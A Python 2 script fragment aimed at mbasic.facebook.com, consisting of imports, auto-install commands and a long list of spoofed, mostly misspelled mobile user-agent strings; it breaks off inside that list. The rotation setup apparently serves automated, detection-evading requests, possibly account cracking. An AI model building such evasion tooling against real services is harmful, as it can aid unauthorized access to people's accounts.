#-*-coding:utf-8-*-

import uuid
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
 
host="https://mbasic.facebook.com"

us = [
 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9620; pt-BR) AppleWebKit/534.11 (KHTML, like Gecko) Version/7.1.0.1112 Mobile Safari/534.11',
 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70',
 'Mozila/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214',
 'Mozila/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP',
 'Mozila/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326',
 'Mozila/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10',
 'Mozila/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30',
 'Mozila/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta',
 'Mozila/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.0; vivo 1713 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 OPR/47.2.2254.147957',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1225 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; OPPO CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 AlohaBrowser/2.1.2.1',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 7.0; en-US; vivo 1714 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.3.2249.130976',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-us; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1',
 'Mozila/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1723 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; vivo 1802 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.0.1302 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/50.0.2254.149182',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; Tesseract/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414',
 'Mozila/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.0.2192.110129,gzip(gfe)',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1; vivo Y21 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.3.2461.138727',
 'Mozila/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36,gzip(gfe)',
 'Mozila/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1',
 'Mozila/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.6.1222 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.1.42173AP',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 OPR/52.2.2254.54723',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574',
 'Mozila/5.0 (Linux; Android 8.1.0; Infinix X606B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.6 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 6.0; CPH1609 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; Android 9; vivo 1907 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2',
 'Mozila/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 OPR/53.1.2254.55490',
 'Mozila/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36,gzip(gfe)',
 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.5.0.1',
 'Mozila/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.3.4',
 'Mozila/5.0 (Linux; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.1) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21',
 'Mozila/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.1.900 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.75 Mobile Safari/537.36 OPR/52.0.2254.54030',
 'Mozila/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21NULL',
 'Mozila/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.2.2461.137690',
 'Mozila/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.106 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.10 YaSearchBrowser/11.10',
 'Mozila/5.0 (Linux; Android 5.1.1; OPPO R7sPlus Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.3 baiduboxapp/9.3.0.10 (Baidu; P1 5.1.1)',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 6.0.1; in-ID; vivo 1606 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.5.900 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.10 YaSearchBrowser/11.10',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 YaApp_Android/9.66 YaSearchBrowser/9.66',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.1) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21',
 'Mozila/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91',
 'Mozila/5.0 (Linux; Android 6.0; vivo 1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.1.42141AP',
 'Mozila/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 GSA/11.8.9.21.arm',
 'Mozila/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.0.2192.110129,gzip(gfe)',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-US; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 OPT/2.6',
